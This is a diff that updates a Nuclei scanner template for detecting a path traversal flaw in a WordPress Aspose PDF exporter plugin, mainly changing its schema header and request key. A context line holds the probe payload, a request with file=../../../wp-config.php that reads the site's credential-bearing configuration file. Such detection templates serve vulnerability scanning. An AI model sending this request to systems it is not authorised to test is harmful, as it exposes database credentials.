@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: aspose-pdf-file-download
 
 info:
@@ -14,7 +15,7 @@ info:
     cwe-id: CWE-22
   tags: wordpress,wp-plugin,lfi,aspose
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/Wordpress/Aaspose-pdf-exporter/aspose_pdf_exporter_download.php?file=../../../wp-config.php'
